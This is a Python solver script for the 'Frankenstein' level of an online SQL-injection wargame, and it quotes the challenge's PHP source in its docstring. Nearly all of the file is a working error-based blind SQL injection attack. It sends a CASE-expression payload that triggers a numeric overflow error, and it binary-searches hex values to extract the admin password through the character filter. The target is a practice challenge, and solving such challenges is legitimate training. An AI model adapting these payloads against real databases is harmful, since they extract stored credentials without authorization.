#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'config' in args[0]


def main():
    '''
    Frankenstein

    if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
      $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
      echo "<hr>query : <strong>{$query}</strong><hr><br>";
      $result = @mysqli_fetch_array(mysqli_query($db,$query));
      if(mysqli_error($db)) exit("error");

      $_GET[pw] = addslashes($_GET[pw]);
      $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
      $result = @mysqli_fetch_array(mysqli_query($db,$query));
      if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
    '''

    url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    num_of_requests = 0
    a = 0
    b = 0xffffffffffffffffffff

    while b - a != 0:
        center = hex(a + (b - a) // 2 + 1)
        if(len(center) % 2 != 0):
            center = "0x0" + center[2:]
        payload = f"'||id='admin' and case when pw<{center} then 1 else 9e307*2 end#"
        param = dict(pw=payload)
        response = los.get_request(url, param, cook)
        num_of_requests += 1
        if check_func(response):
            b = int(center, 0) - 1
        else:
            a = int(center, 0)

    result = bytearray.fromhex(hex(a)[2:]).decode().lower().strip()

    print('num_of_requests:', num_of_requests)

    param = {'id': 'admin', 'pw': result}
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Frankenstein Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
